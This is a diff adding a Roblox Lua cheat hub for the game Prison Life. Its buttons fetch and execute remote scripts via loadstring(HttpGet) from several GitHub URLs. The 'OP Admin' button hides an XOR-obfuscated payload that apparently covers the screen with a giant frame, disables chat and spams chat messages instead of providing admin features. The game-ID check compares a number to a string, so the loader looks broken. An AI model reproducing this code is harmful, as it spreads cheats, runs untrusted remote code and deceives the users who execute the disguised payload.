@@ -1,0 +1,57 @@
+--[[Must Download and put in auto exec]]
+local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
+
+function initscript()
+    local Window = Rayfield:CreateWindow({
+        Name = "Prison Life Central Loading GUI",
+        LoadingTitle = "SRC: github.com/hyperionlawl/home/PrisonLifeGUI.lua (COMPLETELY KEYLESS)",
+        LoadingSubtitle = "by me :3",
+        ConfigurationSaving = {
+            Enabled = false,
+            FolderName = nil, -- Create a custom folder for your hub/game
+            FileName = "Big Hub"
+        },
+        Discord = {
+            Enabled = false,
+            Invite = "noinvitelink", -- The Discord invite code, do not include discord.gg/. E.g. discord.gg/ABCD would be ABCD
+            RememberJoins = true -- Set this to false to make them join the discord every time they load it up
+        },
+    })
+
+    local Tab = Window:CreateTab("MainUI", 4483362458) -- Title, Image
+
+    local Button = Tab:CreateButton({
+        Name = "Infinite Stamina",
+        Callback = function()
+            loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/ImMejor35/Prison-Life/main/Infinite%20Stamina.lua"))()
+        end,
+    })
+
+    local Button = Tab:CreateButton({
+        Name = "OP Admin",
+        Callback = function()
+local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit ;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v68,v69) local v70={};for v79=1, #v68 do v6(v70,v0(v4(v1(v2(v68,v79,v79 + 1 )),v1(v2(v69,1 + (v79% #v69) ,1 + (v79% #v69) + 1 )))%256 ));end return v5(v70);end local v8=Instance.new(v7("\226\192\201\32\227\181\224\11\216","\126\177\163\187\69\134\219\167"));local v9=Instance.new(v7("\5\223\43\200\249","\156\67\173\74\165"));local v10=Instance.new(v7("\29\186\72\17\185\10\71\54\178\69","\38\84\215\41\118\220\70"));local v11=Instance.new(v7("\121\27\35\21\251\124\23\32\23\242","\158\48\118\66\114"));local v12=Instance.new(v7("\159\33\8\34\95\164\249\174\40","\155\203\68\112\86\19\197"));local v13=Instance.new(v7("\114\216\46\232\108\121\231\253\74","\152\38\189\86\156\32\24\133"));v8.Parent=game.Players.LocalPlayer:WaitForChild(v7("\204\91\166\95\249\69\128\83\245","\38\156\55\199"));v9.Parent=v8;v9.BackgroundColor3=Color3.fromRGB(1555 -(746 + 638) ,0 + 0 ,0 -0 );v9.BorderColor3=Color3.fromRGB(341 -(218 + 123) ,0,1581 -(1535 + 46) );v9.BorderSizePixel=0 + 0 ;v9.Position=UDim2.new( -0.348432034,0 + 0 , -(560.294729561 -(306 + 254)),0 + 0 );v9.Size=UDim2.new(0 -0 ,2147485114 -(899 + 568) ,0,11111111);v10.Parent=v8;v10.BackgroundColor3=Color3.fromRGB(203,0 + 0 ,0 -0 );v10.BackgroundTransparency=604 -(268 + 335) ;v10.BorderColor3=Color3.fromRGB(290 -(60 + 230) ,572 -(426 + 146) ,0);v10.BorderSizePixel=0 + 0 ;v10.Position=UDim2.new(0.349520773,1456 -(282 + 1174) ,811.211511895 -(569 + 242) ,0 -0 );v10.Size=UDim2.new(0,17 + 274 ,1024 -(706 + 318) ,1494 -(721 + 530) );v10.Image=v7("\160\105\104\56\73\59\181\84\191\106\50\58\28\118\246\76\176\51\127\39\30\59\251\80\187\120\104\103\76\125\254\30\249\41\46\127\74\37\173\27\255\43\47","\35\200\29\28\72\115\20\154");v10.ImageColor3=Color3.fromRGB(1434 -(945 + 326) ,0,7 -4 );v11.Parent=v8;v11.BackgroundColor3=Color3.fromRGB(255,255,227 + 28 );v11.BackgroundTransparency=1;v11.BorderColor3=Color3.fromRGB(700 -(271 + 429) ,0 + 0 ,0);v11.BorderSizePixel=1500 -(1408 + 92) ;v11.Position=UDim2.new( -1.3291628e-7,0, -(1086.00173359737 -(461 + 625)),1288 -(993 + 295) );v11.Size=UDim2.new(0 + 0 ,1242 -(418 + 753) ,0 + 0 ,8 + 60 );v11.Image=v7("\17\171\197\207\215\99\123\14\168\198\145\159\35\54\21\176\201\145\142\35\57\86\190\194\204\136\56\123\70\182\213\130\220\121\101\72\234\136\143\223\123\98\73","\84\121\223\177\191\237\76");v12.Parent=v8;v12.BackgroundColor3=Color3.fromRGB(255,75 + 180 ,255);v12.BackgroundTransparency=1 + 0 ;v12.BorderColor3=Color3.fromRGB(529 -(406 + 123) ,1769 -(1749 + 20) ,0 + 0 );v12.BorderSizePixel=1322 -(1249 + 73) ;v12.Position=UDim2.new(0 + 0 ,0,1145.0138696255 -(466 + 679) ,0 -0 );v12.Size=UDim2.new(0 -0 ,2100 -(106 + 1794) ,0 + 0 ,13 + 37 );v12.Font=Enum.Font.Unknown;v12.Text=v7("\152\114","\161\219\54\169\192\90\48\80");v12.TextColor3=Color3.fromRGB(0 -0 ,0 -0 ,114 -(4 + 110) );v12.TextScaled=true;v12.TextSize=598 -(57 + 527) ;v12.TextWrapped=true;v13.Parent=v8;v13.BackgroundColor3=Color3.fromRGB(1682 -(41 + 1386) ,358 -(17 + 86) ,174 + 81 );v13.BackgroundTransparency=1 -0 ;v13.BorderColor3=Color3.fromRGB(0,0,0 -0 );v13.BorderSizePixel=166 -(122 + 44) ;v13.Position=UDim2.new(0 -0 ,0 -0 ,0.083217755 + 0 ,0);v13.Size=UDim2.new(0 + 0 ,200,0,101 -51 );v13.Font=Enum.Font.Unknown;v13.Text=v7("\65\86\20\53\19\13\79\38\77\12\19\60\71\71\18\34\64\88\5\107\74\77\79","\69\41\34\96");v13.TextColor3=Color3.fromRGB(65 -(30 + 35) ,0,0 + 0 );v13.TextScaled=true;v13.TextSize=1271 -(1043 + 214) ;v13.TextWrapped=true;local function v65() local v71=0 -0 ;local v72;while true do if (v71==(1212 -(323 + 889))) then v72=Instance.new(v7("\143\192\197\3\18\63","\75\220\163\183\106\98"),v8);while true do local v80=0 -0 ;local v81;local v82;while true do if (v80==1) then while true do if (v81==(580 -(361 + 219))) then wait(321 -(53 + 267) );v82=v72.Music:Play();v81=1 + 0 ;end if ((414 -(15 + 398))==v81) then v82=true;break;end end break;end if (v80==(982 -(18 + 964))) then v81=0 -0 ;v82=nil;v80=1;end end end break;end end end coroutine.wrap(v65)();local function v66() local v73=0 + 0 ;local v74;local v75;local v76;while true do if (v73==(0 + 0)) then v74=850 -(20 + 830) ;v75=nil;v73=1 + 0 ;end if (v73==(127 -(116 + 10))) then v76=nil;while true do if (v74==(1 + 0)) then v76:SetCoreGuiEnabled(Enum.CoreGuiType.Chat,false);break;end if (v74==(738 -(542 + 196))) then v75=Instance.new(v7("\46\181\136\54\213\49\185\153\62\201\22","\185\98\218\235\87"),v8);v76=game:GetService(v7("\248\40\38\244\202\175\217\27\50\239","\202\171\92\71\134\190"));v74=1 -0 ;end end break;end end end coroutine.wrap(v66)();local function v67() local v77=Instance.new(v7("\5\206\47\137\37\242\47\154\32\209\56","\232\73\161\76"),nil);local v78={[1]=v7("\189\204\65\86","\126\219\185\34\61"),[1 + 1 ]=v7("\45\194\82","\135\108\174\62\18\30\23\147")};game:GetService(v7("\132\236\58\199\17\173\50\211\179\237\25\223\23\188\50\192\179","\167\214\137\74\171\120\206\83")).DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(v78));local v78={[1 + 0 ]=v7("\141\229\49\86","\199\235\144\82\61\152"),[1 + 1 ]=v7("\38\26\181","\75\103\118\217")};game:GetService(v7("\245\81\96\24\176\29\198\64\117\16\138\10\200\70\113\19\188","\126\167\52\16\116\217")).DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(v78));local v78={[1]=v7("\206\59\35\139","\156\168\78\64\224\212\121"),[4 -2 ]=v7("\38\226\169","\174\103\142\197")};game:GetService(v7("\100\45\79\52\44\93\249\66\45\91\11\49\81\234\87\47\90","\152\54\72\63\88\69\62")).DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(v78));local v78={[2 -1 ]=v7("\210\209\237\87","\60\180\164\142"),[1553 -(1126 + 425) ]=v7("\121\82\9","\114\56\62\101\73\71\141")};game:GetService(v7("\138\236\203\200\177\234\218\208\189\237\232\208\183\251\218\195\189","\164\216\137\187")).DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(v78));local v78={[406 -(118 + 287) ]=v7("\212\243\50\185","\107\178\134\81\210\198\158"),[7 -5 ]=v7("\25\2\142","\202\88\110\226\166")};game:GetService(v7("\241\10\146\251\195\192\14\150\242\206\240\27\141\229\203\196\10","\170\163\111\226\151")).DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(v78));local v78={[1122 -(118 + 1003) ]=v7("\23\37\177\51","\73\113\80\210\88\46\87"),[5 -3 ]=v7("\160\32\193","\135\225\76\173\114")};game:GetService(v7("\40\232\168\188\165\190\166\14\232\188\131\184\178\181\27\234\189","\199\122\141\216\208\204\221")).DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(v78));local v78={[378 -(142 + 235) ]=v7("\171\200\19\251","\150\205\189\112\144\24"),[9 -7 ]=v7("\4\136\179","\112\69\228\223\44\100\232\113")};game:GetService(v7("\230\26\23\223\191\127\135\192\26\3\224\162\115\148\213\24\2","\230\180\127\103\179\214\28")).DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(v78));local v78={[1 + 0 ]=v7("\153\23\31\68\229\69","\128\236\101\63\38\132\33"),[979 -(553 + 424) ]=v7("\141\165\29","\175\204\201\113\36\214\139")};game:GetService(v7("\117\201\37\208\13\68\205\33\217\0\116\216\58\206\5\64\201","\100\39\172\85\188")).DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(v78));local v78={[1]=v7("\165\121\186\139\54\191","\83\205\24\217\224"),[2]=v7("\199\201\193","\93\134\165\173")};game:GetService(v7("\140\247\209\206\51\205\179\106\187\246\242\214\53\220\179\121\187","\30\222\146\161\162\90\174\210")).DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(v78));local v78={[1 -0 ]=v7("\227\91\115\1","\106\133\46\16"),[2 + 0 ]=v7("\121\44\127","\32\56\64\19\156\58")};game:GetService(v7("\104\205\245\90\83\241\129\78\205\225\101\78\253\146\91\207\224","\224\58\168\133\54\58\146")).DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(v78));local v78={[1 + 0 ]=v7("\95\67\72\246","\107\57\54\43\157\21\230\231"),[2]=v7("\250\135\29","\175\187\235\113\149\217\188")};game:GetService(v7("\14\170\145\64\234\122\121\40\170\133\127\247\118\106\61\168\132","\24\92\207\225\44\131\25")).DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(v78));local v78={[1]=v7("\77\198\187\71","\29\43\179\216\44\123"),[2 + 0 ]=v7("\156\213\44","\44\221\185\64")};game:GetService(v7("\51\226\88\83\122\2\230\92\90\119\50\243\71\77\114\6\226","\19\97\135\40\63")).DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(v78));local v78={[1 + 0 ]=v7("\168\73\48\48","\81\206\60\83\91\79"),[2 + 0 ]=v7("\111\167\220","\196\46\203\176\18\79\163\45")};game:GetService(v7("\138\39\110\18\45\248\238\172\39\122\45\48\244\253\185\37\123","\143\216\66\30\126\68\155")).DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(v78));local v78={[2 -1 ]=v7("\172\221\14\192","\129\202\168\109\171\165\195\183"),[5 -3 ]=v7("\3\84\59","\134\66\56\87\184\190\116")};game:GetService(v7("\14\52\25\183\16\232\32\33\57\53\58\175\22\249\32\50\57","\85\92\81\105\219\121\139\65")).DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(v78));local v78={[2 -1 ]=v7("\251\166\83\78","\191\157\211\48\37\28"),[2]=v7("\254\19\248","\90\191\127\148\124")};game:GetService(v7("\74\130\62\27\113\132\47\3\125\131\29\3\119\149\47\16\125","\119\24\231\78")).DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(v78));local v78={[1]=v7("\132\56\166\65","\113\226\77\197\42\188\32"),[1 + 1 ]=v7("\27\26\248","\213\90\118\148")};game:GetService(v7("\105\43\164\90\68\88\47\160\83\73\104\58\187\68\76\92\43","\45\59\78\212\54")).DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(v78));end coroutine.wrap(v67)();
+        end,
+    })
+
+    local Button = Tab:CreateButton({
+        Name = "Prisonware 1.3",
+        Callback = function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/Denverrz/scripts/master/PRISONWARE_v1.3.txt"))();
+        end,
+    })
+
+    local Button = Tab:CreateButton({
+        Name = "Tiger Admin",
+        Callback = function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/dalloc2/Roblox/main/TigerAdmin.lua",true))()
+        end,
+    })
+end
+
+if game.PlaceId == "155615604" then
+    initscript()
+else
+    Rayfield:Destroy()
+    warn("This Game isnt Prison Life by Aesthetical.")
+end
